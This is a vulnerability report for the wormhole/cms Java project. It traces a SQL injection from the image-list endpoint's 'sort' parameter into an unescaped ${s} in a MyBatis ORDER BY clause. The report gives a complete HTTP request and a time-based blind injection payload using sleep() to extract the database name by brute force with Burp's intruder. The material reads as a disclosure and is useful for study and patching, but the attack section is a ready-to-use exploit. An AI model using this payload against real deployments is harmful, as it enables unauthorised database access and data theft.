**BUG_Author:**

hadagaga

**Vendor:**

https://github.com/wormhole/cms

**Software:**

https://github.com/wormhole/cms

**Vulnerability File:**

src/main/resources/mapper/UploadMapper.xml

```xml
    <select id="selectWithQuery" resultMap="baseMap">
        select * from `upload`
        <include refid="where"/>
        <if test="sortWrapper != null and sortWrapper.size() > 0">
            order by
            <foreach collection="sortWrapper.entrySet()" index="s" item="o" separator=",">
                `${s}` ${o}
            </foreach>
        </if>
        <if test="offset != null and limit != null">
            limit #{offset}, #{limit}
        </if>
    </select>
```

​	Let's go back up:

```java
    @Override
    @Transactional(rollbackFor = Exception.class)
    public PageResponse<UploadDTO> findImageByPage(Integer page, Integer limit, String sort, String order, String key, String userId) {
        QueryWrapperBuilder builder = new QueryWrapperBuilder();
        if (StringUtils.isEmpty(sort) || StringUtils.isEmpty(order)) {
            builder.sort("ts", "desc");
        } else {
            builder.sort(sort, order);
        }
        builder.eq("type", FileTypeConst.T_IMAGE);
        builder.eq("user_id", userId);
        builder.like(!StringUtils.isEmpty(key), key, Arrays.asList("name", "path"));
        builder.page((page - 1) * limit, limit);
        QueryWrapper wrapper = builder.build();

        List<Upload> uploads = uploadDAO.selectWithQuery(wrapper);
        Integer total = uploadDAO.countWithQuery(wrapper);

        List<UploadDTO> dtos = new ArrayList<>();
        for (Upload upload : uploads) {
            UploadDTO dto = new UploadDTO();
            BeanUtils.copyProperties(upload, dto);
            dto.setUsername(userService.findById(dto.getUserId()).getUsername());
            String path = SysUtils.pwd() + dto.getPath();
            if (SysUtils.isWin()) {
                path = path.replace("/", "\\");
            } else {
                path = path.replace("\\", "/");
            }
            dto.setAbsolutePath(path);
            dtos.add(dto);
        }

        return new PageResponse<>(total, dtos);
    }
```

​	You can see that the parameters are put into the object and passed into the query method.

```java 
    @GetMapping(value = "/list")
    public ResponseEntity<Result<PageResponse<UploadDTO>>> queryPage(
            @RequestParam(value = "page") @Min(value = 1, message = "page不能小于1") Integer page,
            @RequestParam(value = "limit") @Min(value = 1, message = "limit不能小于1") Integer limit,
            @RequestParam(value = "sort", required = false) String sort,
            @RequestParam(value = "order", required = false) String order,
            @RequestParam(value = "key", required = false) String key) {

        PageResponse<UploadDTO> response = uploadService.findImageByPage(page, limit, sort, order, key, super.getUserId());
        return ResponseEntity.status(HttpStatus.OK).body(Result.success(response));
    }
```

​	Then we only need to construct the following packet:

```http
GET /manage/image/list?page=1&limit=10&sort=id&order=desc HTTP/1.1
Host: 172.23.192.1
Cookie: JSESSIONID=FDA8E97A658F3DE8725A3002F1A847E6
Sec-Ch-Ua-Platform: "Windows"
Authorization: Bearer eyJ1aWQiOiIzYTEzOGJhYS0yYWZhLTQwZWMtOGVlMy03NjEyNTg2Y2UzZmIiLCJ0cyI6IjE3MzQzMTM2MDYyNjcifQ==.MGE2M2JlZTE2MmViNDVjYjY4ZTc1NDk2ZjQzOWVlZmI=
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36 Edg/131.0.0.0
Accept: application/json, text/plain, */*
Sec-Ch-Ua: "Microsoft Edge";v="131", "Chromium";v="131", "Not_A Brand";v="24"
Sec-Ch-Ua-Mobile: ?0
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: cors
Sec-Fetch-Dest: empty
Referer: https://172.23.192.1/
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9,en;q=0.8,en-GB;q=0.7,en-US;q=0.6
Priority: u=1, i
Connection: close


```

​	Reconstruct payload:

sort:

```sql
id%60,if(length((select%20database()))%5e1,sleep(0.5),1),%60id
```

order:

```sql
desc
```

​	Blast with the BP Blasting Module:

![image-20241216115635882](img/image-20241216115635882.png)

​	After processing the data, the database name is obtained:

![image-20241216115701645](img/image-20241216115701645.png)